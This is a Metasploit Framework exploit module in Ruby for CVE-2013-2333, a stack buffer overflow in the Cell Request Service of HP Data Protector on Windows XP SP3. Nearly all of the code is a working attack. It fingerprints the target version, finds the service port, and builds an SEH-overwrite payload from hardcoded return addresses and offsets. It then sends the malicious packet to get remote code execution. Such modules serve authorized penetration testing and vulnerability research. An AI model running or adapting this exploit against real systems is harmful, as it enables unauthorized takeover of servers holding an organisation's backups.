##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP Data Protector Cell Request Service Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in the Hewlett-Packard Data Protector
        product. The vulnerability, due to the insecure usage of _swprintf, exists at the Cell
        Request Service (crs.exe) when parsing packets with opcode 211. This module has been tested
        successfully on HP Data Protector 6.20 and 7.00 on Windows XP SP3.
      },
      'Author'         =>
        [
          'e6af8de8b1d4b2b6d5ba2610cbf9cd38', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-2333' ],
          [ 'OSVDB', '93867' ],
          [ 'BID', '60309' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-130/' ]
        ],
      'Privileged'     => true,
      'Payload' =>
        {
          'Space'    => 4096,
          'BadChars' => "\x00\xff\x20" # "\x00\x00", "\xff\xff" and "\x20\x00" not allowed
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [ 'HP Data Protector 6.20 build 370 / Windows XP SP3',
            {
              'Ret' => 0x00436fe2, # ppr from crs.exe
              'Offset' => 15578
            }
          ],
          [ 'HP Data Protector 7.00 build 72 / Windows XP SP3',
            {
              'Ret' => 0x004cf8c1, # ppr from crs.exe
              'Offset' => 15578
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 03 2013'))

    deregister_options('RPORT') # The CRS service runs on a random port
  end

  def build_pkt(fields)
    data = "\xff\xfe" # BOM Unicode
    fields.each do |k, v|
      if k == "Payload"
        data << "#{v}\x00\x00"
      else
        data << "#{Rex::Text.to_unicode(v)}\x00\x00"
      end
      data << Rex::Text.to_unicode(" ") # Separator
    end

    data.chomp!(Rex::Text.to_unicode(" ")) # Delete last separator
    data << "\x00\x00" # Ending
    return [data.length].pack("N") + data
  end

  def get_fingerprint
    ommni = connect(false, {'RPORT' => 5555})
    ommni.put(rand_text_alpha_upper(64))
    resp = ommni.get_once(-1)
    disconnect

    if resp.nil?
      return nil
    end

    return Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last nl
  end

  def get_crs_port

    pkt = build_pkt({
      "Opcode"          => "2",
      "FakeMachineName" => rand_text_alpha(8),
      "Unknown1"        => "0",
      "FakeDomainUser"  => rand_text_alpha(8),
      "FakeDomain"      => rand_text_alpha(8),
      "FakeLanguage"    => rand_text_alpha(8),
      "Unknown2"        => "15"
    })
    ommni = connect(false, {'RPORT' => 5555})
    ommni.put(pkt)
    resp = ommni.get_once(-1)
    disconnect

    if resp.nil?
      return nil
    end

    res_length, bom_unicode, res_data = resp.unpack("Nna*")

    fields = res_data.split(Rex::Text.to_unicode(" "))

    opcode = fields[0]
    port = fields[1]

    if not opcode or not port
      vprint_error("Unexpected response")
      return nil
    end

    opcode = Rex::Text.to_ascii(opcode.chomp("\x00\x00"))

    if opcode != "109"
      vprint_error("Unexpected opcode #{opcode} in the response")
      return nil
    end

    port = Rex::Text.to_ascii(port.chomp("\x00\x00"))
    return port.to_i
  end

  def check
    fingerprint = get_fingerprint

    if fingerprint.nil?
      return Exploit::CheckCode::Unknown
    end

    port = get_crs_port

    if port.nil?
      print_status("HP Data Protector version #{fingerprint}")
      print_error("But CRS port not found")
    else
      print_status("CRS running on port #{port}/TCP, HP Data Protector version #{fingerprint}")
    end

    if fingerprint =~ /HP Data Protector A\.06\.20: INET, internal build 370/
      return Exploit::CheckCode::Vulnerable
    elsif fingerprint =~ /HP Data Protector A\.07\.00: INET, internal build 72/
      return Exploit::CheckCode::Vulnerable
    elsif fingerprint =~ /HP Data Protector A\.07\.00/
      return Exploit::CheckCode::Appears
    elsif fingerprint =~ /HP Data Protector A\.07\.01/
      return Exploit::CheckCode::Appears
    elsif fingerprint =~ /HP Data Protector A\.06\.20/
      return Exploit::CheckCode::Appears
    elsif fingerprint =~ /HP Data Protector A\.06\.21/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def get_target
    fingerprint = get_fingerprint

    if fingerprint.nil?
      return nil
    end

    if fingerprint =~ /HP Data Protector A\.06\.20: INET, internal build 370/
      return targets[1]
    elsif fingerprint =~ /HP Data Protector A\.07\.00: INET, internal build 72/
      return targets[2]
    else
      return nil
    end
  end

  def exploit

    if target.name =~ /Automatic/
      print_status("Trying to find the target version...")
      my_target = get_target
    else
      my_target = target
    end

    if my_target.nil?
      fail_with(Failure::NoTarget, "Failed to autodetect target")
    end

    print_status("Trying to find the CRS service port...")
    port = get_crs_port
    if port.nil?
      fail_with(Failure::NotFound, "The CRS service has not been found.")
    else
      print_good("CRS service found on #{port}/TCP")
      connect(true, {'RPORT' => port})
    end

    pkt = build_pkt({
      "Opcode"            => "0",
      "EndPoint"          => "GUICORE",
      "ClientFingerprint" => "HP OpenView OmniBack II A.06.20",
      "FakeUsername"      => rand_text_alpha(8),
      "FakeDomain"        => rand_text_alpha(8),
      "Unknown1"          => "488",
      "Unknown2"          => rand_text_alpha(8)
    })
    print_status("Sending packet with opcode 0...")
    sock.put(pkt)
    data = sock.get_once(-1)

    if data.nil?
      fail_with(Failure::Unknown, "Error while communicating with the CRS Service")
    end

    if Rex::Text.to_ascii(data) !~ /NT-5\.1/
      fail_with(Failure::NoTarget, "Exploit only compatible with Windows XP targets")
    end

    pkt = build_pkt({
      "Opcode" => "225"
    })
    print_status("Sending packet with opcode 225...")
    sock.put(pkt)
    data = sock.get_once(-1)

    if data.nil?
      fail_with(Failure::Unknown, "Error while communicating with the CRS Service")
    end

    bof = payload.encoded
    bof << rand_text(my_target["Offset"] - payload.encoded.length)
    bof << generate_seh_record(my_target.ret)
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{my_target['Offset']+8}").encode_string
    bof << rand_text(100) # Trigger Exception

    pkt = build_pkt({
      "Opcode"  => "211",
      "Payload" => bof
    })
    print_status("Sending malicious packet with opcode 211...")
    sock.put(pkt)
    disconnect
  end

end
